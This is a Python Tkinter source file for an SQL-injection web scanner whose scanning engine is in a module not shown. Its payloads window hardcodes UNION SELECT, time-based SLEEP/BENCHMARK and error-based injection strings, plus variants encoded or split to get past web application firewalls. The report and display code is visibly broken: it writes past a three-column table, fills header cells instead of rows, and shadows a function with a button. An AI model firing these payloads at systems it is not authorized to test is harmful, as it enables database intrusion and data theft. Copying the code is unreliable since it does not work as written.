# coding:utf8
import tkinter as tk
import os
import tkinter.ttk
import tkinter.filedialog
import random

from docx import Document
from docx.shared import Inches

from vulscan import *


global output


def handlerAdaptor(fun, **kwds):
    return lambda event, fun=fun, kwds=kwds: fun(event, **kwds)


def a(path):
    with open(path, 'r') as f:
        content = f.read().splitlines()
    thread_it(vulscan_P, content, int(threads.get()), int(depth.get()), "sql", output, open("log.txt", 'a'),waf)


def open_file():
    file_path = tkinter.filedialog.askopenfilename(title='Choose a file')
    a(file_path)

def save_file():
    file_path = tkinter.filedialog.asksaveasfilename(title='Save a file',defaultextension=".docx", filetypes=(("word","*.docx"),("All Files","*.*") ))
    document = Document()
    children = output.get_children("")
    document.add_heading(u'Result of web scan: '+output.item(children[0], "values")[0], 3)
    p_total = document.add_heading()
    r_total = p_total.add_run("")
    r_total.font.bold = True
    table = document.add_table(rows=1, cols=3, style="Light List Accent 5")
    hdr_cells = table.rows[0].cells
    hdr_cells[0].text = 'Url'
    hdr_cells[1].text = 'Payload'
    hdr_cells[2].text = 'Injectbale'
    hdr_cells[3].text = 'CVSS'
    i = 0
    for child in children:
        if i == 0:
            i = i + 1
            continue
        row_cells = table.add_row().cells
        row_cells[0].text = output.item(child, "values")[0]
        row_cells[1].text = output.item(child, "values")[1]
        row_cells[2].text = output.item(child, "values")[2]
        hdr_cells[3].text = output.item(child, "values")[3]
    document.save(file_path)

def thread(func, *args):
    output.insert("", "end", values=(url.get(), "", "", ""))
    t = threading.Thread(target=func, args=args)
    t.setDaemon(True)
    t.start()
    start = time.time()
    gettime(start)
    progress()



def thread_it(func, *args):
    t = threading.Thread(target=func, args=args)
    t.setDaemon(True)
    t.start()
    start = time.time()
    gettime(start)
    progress()
    return t

def progress():

    fill_line = canvas.create_rectangle(1.5, 1.5, 0, 23, width=0, fill="green")
    x = 500
    n = float(465 / x)
    for i in range(x):
        if threading.activeCount() <= 2:
            canvas.coords(fill_line, (0, 0, 466, 60))
            break
        n = n + float(465) / 500
        canvas.coords(fill_line, (0, 0, n, 60))
        root.update()
        time.sleep(random.uniform(0.8,1.2))


def gettime(start):
    elap=time.time()-start
    minutes = int(elap/60)
    seconds = int(elap)
    hseconds = int((elap - minutes*60.0 - seconds) *1000)
    var.set(seconds)
    if threading.activeCount() > 2:
        root.after(1, gettime,start)

def payloads():
    top = tkinter.Toplevel()
    top.title('Payloads')
    top.minsize(600,400)
    pl = tkinter.ttk.Treeview(top, show="headings", height=18, columns="a")
    pl.heading("a", text="Payload")
    pl.place(x=5, y=5)
    pl.column("a", width=580, anchor="w")
    payload_0 = [" and\ 0;-- ",
                 "/**/and/**/0;#",
                 "\tand\t0;#",
                 "\nand/**/0;#",
                 " UNION\ ALL\ SELECT\ 1,2,3,4",
                 " UNION\ ALL\ SELECT\ 1,2,3,4,5-- ",
                 " UNION\ SELECT\ @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5",
                 " UNION\ ALL\ SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- ",
                 " AND\ 5650=CONVERT(INT,(UNION\ ALL\ SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- ",
                 " UNION\ ALL\ SELECT\ 'INJ'||'ECT'||'XXX',2,3,4,5--",
                 " RLIKE\ (SELECT\ (CASE\ WHEN\ (4346=4346)\ THEN\ 0x61646d696e\ ELSE\ 0x28\ END))\ AND\ 'Txws'='",
                 ]
    payload_1 = [" And\ 0;-- ",
                 "/**/And/**/0;#",
                 "\tAnd\t0;#",
                 "\nAnd/**/0;#",
                 " Union\ All\ Select\ 1,2,3,4",
                 " Union\ All\ Select\ 1,2,3,4,5-- ",
                 " Union\ All\ Select\ @@version,sleep(5),user(),benchmark(1000000,md5('A')),5",
                 " Union\ All\ Select\ @@version,user(),sleep(5),benchmark(1000000,md5('A')),null,null,null-- ",
                 " And\ 5650=CONVERT(int,(Union\ all\ selectchar(88)+char(88)+char(88)))-- ",
                 " Union\ All\ Select\ 'inj'||'ect'||'xxx',2,3,4,5--",
                 " Rlike\ (Select\ (case\ when\ (4346=4346)\ then\ 0x61646d696e\ else\ 0x28\ end))\ and\ 'Txws'='",
                 " And%200;--",
                 " Union%20All%20Select%201,2,3,4",
                 " Union%20All%20Select%201,2,3,4,5--",
                 " Union%20All%20Select%20@@version,sleep(5),user(),benchmark(1000000,md5(%27A%27)),5",
                 " Union%20All%20Select%20@@version,user(),sleep(5),benchmark(1000000,md5(%27A%27)),null,null,null--",
                 " And%205650=CONVERT(int,(Union%20all%20selectchar(88)+char(88)+char(88)))--",
                 " Union%20All%20Select%20%27inj%27||%27ect%27||%27xxx%27,2,3,4,5--",
                 " Rlike%20(Select%20(case%20when%20(4346=4346)%20then%200x61646d696e%20else%200x28%20end))%20and%20%27Txws%27=%27",
                 " chr(97)+chr(110)+chr(100)\ 0;-- ",
                 " aandNandd\ 0;-- ",
                 ]
    if waf.cget("text") == 'WAF:None':
        for pp in payload_0:
            pl.insert("", "end", values=(pp))
    else:
        for pp in payload_1:
            pl.insert("", "end", values=(pp))


def view():
    top = tkinter.Toplevel()
    top.title('View result')
    top.minsize(600, 400)
    sel = output.selection()
    lb = tk.Text(top)
    lb.place(x=5,y=5,width=550,height=360)
    for idx in sel:
        if output.item(idx,"values")[1] == '+1':
            lb.insert(tk.END,"Integer Based SQL Injection:\n Content page with integer input in URL. \n id parameter is prone to code injection.")
        elif output.item(idx,"values")[1] == '\'':
            lb.insert(tk.END,"SQL Error Injection:\n Error-based SQLi is an in-band SQL Injection technique "
                             "that relies on error messages thrown by the database server to obtain information about "
                             "the structure of the database. In some cases, error-based SQL injection alone is enough "
                             "for an attacker to enumerate an entire database.")
        else:
            lb.insert(tk.END,"String Based SQL Injection:\n Content page with string input in URL. \n name parameter is prone to code injection.")





root = tk.Tk()
root.title("Web scanner")
root.minsize(850, 530)
var = tk.StringVar()
sec = tk.Label(root, textvariable=var, fg='blue')
sec.place(x=680,y=60)
sec.pack
sec_label = url_label = tk.Label(root, text='Time elapsed:')
sec_label.place(x=580,y=60)
url_label = tk.Label(root, text='URL:')
url_label.place(x=30, y=30)
url = tk.Entry(root)
url.insert(tk.END, "http://testphp.vulnweb.com")
url.place(x=80, y=30, width=300)
thread_label = tk.Label(root, text='Thread number:')
thread_label.place(x=350, y=30)
threads = tk.Entry(root)
threads.place(x=450, y=30, width=30)
threads.insert(tk.END, "10")
depth_label = tk.Label(root, text='Depth:')
depth_label.place(x=480, y=30)
depth = tk.Entry(root)
depth.place(x=530, y=30, width=30)
depth.insert(tk.END, "10")
output = tkinter.ttk.Treeview(root, show="headings", height=18, columns=("a", "b", "c", "d"))
output.column("a", width=500, anchor="center")
output.column("b", width=100, anchor="center")
output.column("c", width=70, anchor="center")
output.column("d", width=100, anchor="center")
output.heading("a", text="Url")
output.heading("b", text="Payload")
output.heading("c", text="Injectable")
output.heading("d", text="CVSS")
output.place(x=40, y=90)
openfile = tk.Button(root, text="Batch process", command=open_file)
openfile.place(x=630, y=28, height=25)
waf = tk.Label(root, text='WAF:None1')
waf.place(x=730,y=30)
# button = tk.Button(root, text="Scan", fg="black", bg="white",command=lambda: vulscan(url.get(), int(threads.get()), int(depth.get()), "sql", output, open("log.txt",'a')))
scan = tk.Button(root, text="Scan", command=lambda: thread(vulscan, url.get(), int(threads.get()), int(depth.get()), "sql", output,open("log.txt", 'a'),waf))
scan.place(x=580, y=28, height=25)
report = tk.Button(root, text="Save report", command=save_file)
report.place(x=730,y=480)
view = tk.Button(root, text="View",command=view)
view.place(x=650,y=480)
tk.Label(root, text='Process:', ).place(x=30, y=60)
canvas = tk.Canvas(root, width=465, height=22, bg="white")
canvas.place(x=90, y=60)
payload = tk.Button(root,text="Payloads",command=payloads)
payload.place(x=730,y=60,height=25)
root.mainloop()

